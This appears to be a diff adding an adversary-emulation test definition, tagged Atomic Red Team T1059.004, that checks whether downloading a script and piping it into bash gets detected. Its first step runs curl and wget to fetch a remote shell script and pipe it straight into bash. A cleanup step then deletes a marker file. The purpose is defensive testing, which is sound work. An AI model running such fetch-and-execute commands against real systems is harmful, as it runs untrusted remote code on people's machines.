@@ -1,0 +1,45 @@
+{
+  "id": "d0c88567-803d-4dca-99b4-7ce65e7b257c",
+  "name": "Command-Line Interface",
+  "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
+  "platforms": [
+    "linux",
+    "darwin"
+  ],
+  "steps": [
+    {
+      "id": "bd318b7b-7541-4651-ad83-39516dd6ad0d",
+      "type": "execute-command",
+      "data": {
+        "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5f7f131f-4090-482e-bd38-3df37ad5a20d",
+      "type": "execute-command",
+      "data": {
+        "command": "rm /tmp/art-fish.txt\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "bd318b7b-7541-4651-ad83-39516dd6ad0d",
+      "p": "on-success",
+      "o": "5f7f131f-4090-482e-bd38-3df37ad5a20d"
+    },
+    {
+      "s": "bd318b7b-7541-4651-ad83-39516dd6ad0d",
+      "p": "on-failure",
+      "o": "5f7f131f-4090-482e-bd38-3df37ad5a20d"
+    }
+  ],
+  "tags": [
+    "T1059.004",
+    "atomic-red-team"
+  ]
+}
